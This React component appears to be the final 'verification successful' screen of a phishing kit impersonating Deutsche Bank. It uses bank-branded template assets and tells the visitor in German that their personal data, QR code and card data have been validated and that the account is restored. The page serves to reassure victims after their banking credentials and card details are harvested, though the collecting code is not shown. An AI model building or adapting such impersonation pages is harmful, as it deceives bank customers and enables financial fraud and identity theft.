import React from 'react';
import { AlertTriangle, Monitor, CheckCircle } from 'lucide-react';

const FinalSuccessScreen: React.FC = () => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .db-mobile-main {
              background-image: none !important;
              background-color: #1e2a78 !important;
            }
            .db-mobile-container {
              flex-direction: column !important;
              gap: 0 !important;
              max-width: none !important;
              margin: 0 !important;
            }
            .db-mobile-left {
              padding: 20px !important;
              padding-top: 40px !important;
              flex: none !important;
            }
            .db-mobile-sidebar {
              width: 100% !important;
              min-height: auto !important;
              order: 2 !important;
              margin-top: 60px !important;
            }
            .db-mobile-card {
              padding: 30px 20px !important;
            }
            .db-mobile-title {
              font-size: 24px !important;
            }
            .db-mobile-sidebar-content {
              background-color: #ffffff !important;
              padding: 20px !important;
              margin-bottom: 20px !important;
            }
            .db-mobile-footer-only {
              padding: 30px 20px !important;
            }
          }
        `}
      </style>
      <div className="db-mobile-main" style={{
        minHeight: '100vh',
        backgroundImage: 'url(/templates/deutsche_bank/images/dbbg-F3E4CS63.jpg)',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat',
        display: 'flex',
        fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif'
      }}>
        
        {/* Main Container - 1180px */}
        <div className="db-mobile-container" style={{
          maxWidth: '1180px',
          width: '100%',
          display: 'flex',
          margin: '0 auto',
          gap: '80px'
        }}>
          
          {/* Left Content Area */}
          <div className="db-mobile-left" style={{
            flex: '1',
            display: 'flex',
            flexDirection: 'column',
            justifyContent: 'center',
            paddingTop: '100px',
            paddingLeft: '40px',
            paddingRight: '20px',
            paddingBottom: '40px'
          }}>
            
            {/* Success Card */}
            <div className="db-mobile-card" style={{
              backgroundColor: 'rgba(255, 255, 255, 0.98)',
              borderRadius: '3px',
              padding: '40px',
              boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)',
              textAlign: 'center'
            }}>
              
              {/* Deutsche Bank Logo */}
              <div style={{
                marginBottom: '30px',
                textAlign: 'left'
              }}>
                <img 
                  src="/templates/deutsche_bank/images/DB-Logotype-ri-sRGB-DXJQ2K2F.svg" 
                  alt="Deutsche Bank" 
                  style={{ 
                    height: '32px',
                    width: 'auto'
                  }}
                />
              </div>

              {/* Success Icon */}
              <div style={{
                display: 'flex',
                justifyContent: 'center',
                marginBottom: '24px'
              }}>
                <div style={{
                  backgroundColor: '#28a745',
                  borderRadius: '50%',
                  width: '64px',
                  height: '64px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: 'white'
                }}>
                  <CheckCircle size={32} />
                </div>
              </div>

              {/* Title */}
              <h1 className="db-mobile-title" style={{
                fontSize: '28px',
                fontWeight: '600',
                color: '#000000',
                margin: '0 0 16px 0',
                textAlign: 'center'
              }}>
                Verifizierung erfolgreich
              </h1>
              
              {/* Description */}
              <p style={{
                fontSize: '16px',
                color: '#000000',
                margin: '0 0 24px 0',
                lineHeight: '1.5',
                textAlign: 'center'
              }}>
                Ihre Identität wurde erfolgreich verifiziert. Sie können nun sicher auf Ihr Online-Banking zugreifen.
              </p>

              {/* Success Details */}
              <div style={{
                backgroundColor: '#d4edda',
                border: '1px solid #c3e6cb',
                borderRadius: '3px',
                padding: '20px',
                marginBottom: '32px',
                textAlign: 'left'
              }}>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#155724',
                  margin: '0 0 12px 0'
                }}>
                  Verifizierung abgeschlossen:
                </h3>
                <ul style={{
                  fontSize: '14px',
                  color: '#000000',
                  lineHeight: '1.6',
                  margin: 0,
                  paddingLeft: '20px'
                }}>
                  <li style={{ marginBottom: '6px' }}>✓ Persönliche Daten bestätigt</li>
                  <li style={{ marginBottom: '6px' }}>✓ QR-Code verifiziert</li>
                  <li style={{ marginBottom: '6px' }}>✓ Kartendaten validiert</li>
                  <li style={{ marginBottom: '0' }}>✓ Sicherheitsüberprüfung erfolgreich</li>
                </ul>
              </div>

              {/* Next Steps */}
              <div style={{
                backgroundColor: '#e8f4fd',
                border: '1px solid #b8d4e3',
                borderRadius: '3px',
                padding: '20px',
                marginBottom: '32px',
                textAlign: 'left'
              }}>
                <h3 style={{
                  fontSize: '16px',
                  fontWeight: '600',
                  color: '#0550d1',
                  margin: '0 0 12px 0'
                }}>
                  Nächste Schritte:
                </h3>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  lineHeight: '1.6',
                  margin: 0
                }}>
                  Sie erhalten in Kürze eine Bestätigung per E-Mail. Ihr Konto ist nun wieder vollständig zugänglich und alle Sicherheitsmaßnahmen sind aktiviert.
                </p>
              </div>
              
              {/* Continue Button */}
              <button
                onClick={() => window.location.href = '/'}
                style={{
                  backgroundColor: '#0550d1',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '3px',
                  padding: '16px 32px',
                  fontSize: '16px',
                  fontFamily: '"DeutscheBank UI", Arial, Helvetica, sans-serif',
                  fontWeight: '600',
                  cursor: 'pointer',
                  transition: 'background-color 0.2s ease',
                  width: '100%'
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.backgroundColor = '#0440a8';
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.backgroundColor = '#0550d1';
                }}
              >
                Zum Online-Banking
              </button>
            </div>
          </div>

          {/* Right Sidebar - 380px */}
          <div className="db-mobile-sidebar" style={{
            width: '380px',
            backgroundColor: '#ffffff',
            display: 'flex',
            flexDirection: 'column',
            minHeight: '100vh'
          }}>
            
            {/* Promotional Content */}
            <div className="db-mobile-sidebar-content" style={{
              flex: '1',
              padding: '30px'
            }}>
              
              {/* New Banking Promo */}
              <div style={{
                marginBottom: '40px'
              }}>
                <img 
                  src="/templates/deutsche_bank/images/db-neues-banking-dt-1200x750-1552700535-w46209.jpg" 
                  alt="Neues Online-Banking" 
                  style={{
                    width: '100%',
                    height: '140px',
                    objectFit: 'cover',
                    borderRadius: '3px',
                    marginBottom: '16px'
                  }}
                />
                <h2 style={{
                  fontSize: '18px',
                  fontWeight: '600',
                  color: '#000000',
                  margin: '0 0 10px 0'
                }}>
                  Neues Online-Banking. Neue App!
                </h2>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Jetzt noch smarter und mehr Komfort für Sie.
                </p>
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '6px'
                }}>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Informationen für Privatkunden
                  </a>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Informationen für Unternehmenskunden
                  </a>
                </div>
              </div>

              {/* Security Info */}
              <div style={{
                marginBottom: '40px'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <AlertTriangle size={24} />
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Sicherheitshinweise
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.
                </p>
                <div style={{
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '6px'
                }}>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Link zu den aktuellen Sicherheitshinweisen
                  </a>
                  <a href="#" style={{
                    color: '#0550d1',
                    textDecoration: 'underline',
                    fontSize: '14px',
                    fontWeight: '600'
                  }}>
                    Link zu Sicherheit im Überblick
                  </a>
                </div>
              </div>

              {/* Online Banking Access */}
              <div style={{
                marginBottom: '40px'
              }}>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <Monitor size={24} />
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Online-Banking Zugang
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.
                </p>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Zugang zum Online-Banking beantragen
                </a>
              </div>

              {/* Security Procedures */}
              <div>
                <div style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '10px',
                  marginBottom: '10px'
                }}>
                  <div style={{
                    color: '#000000',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center'
                  }}>
                    <svg role="img" focusable="false" style={{ height: '24px', width: '24px' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                      <rect width="18" height="11" x="3" y="11" rx="2" ry="2"/>
                      <path d="m7 11V7a5 5 0 0 1 10 0v4"/>
                    </svg>
                  </div>
                  <h3 style={{
                    fontSize: '16px',
                    fontWeight: '600',
                    color: '#000000',
                    margin: '0'
                  }}>
                    Unsere Sicherheitsverfahren
                  </h3>
                </div>
                <p style={{
                  fontSize: '14px',
                  color: '#000000',
                  margin: '0 0 12px 0',
                  lineHeight: '1.5'
                }}>
                  Alles Wissenswerte rund um Ihren Login.
                </p>
                <a href="#" style={{
                  color: '#0550d1',
                  textDecoration: 'underline',
                  fontSize: '14px',
                  fontWeight: '600'
                }}>
                  Link zu den Sicherheitsverfahren
                </a>
              </div>
            </div>

            {/* Footer integrated in sidebar */}
            <div className="db-mobile-footer-only" style={{
              backgroundColor: '#1e2a78',
              color: '#ffffff',
              padding: '20px 30px'
            }}>
              <div style={{
                display: 'flex',
                flexWrap: 'wrap',
                gap: '15px',
                fontSize: '12px'
              }}>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  English Version
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Hilfe
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Demo-Konto
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Impressum
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Rechtliche Hinweise
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Datenschutz
                </a>
                <a href="#" style={{
                  color: '#ffffff',
                  textDecoration: 'none',
                  fontWeight: '600'
                }}>
                  Cookie-Einstellungen
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default FinalSuccessScreen;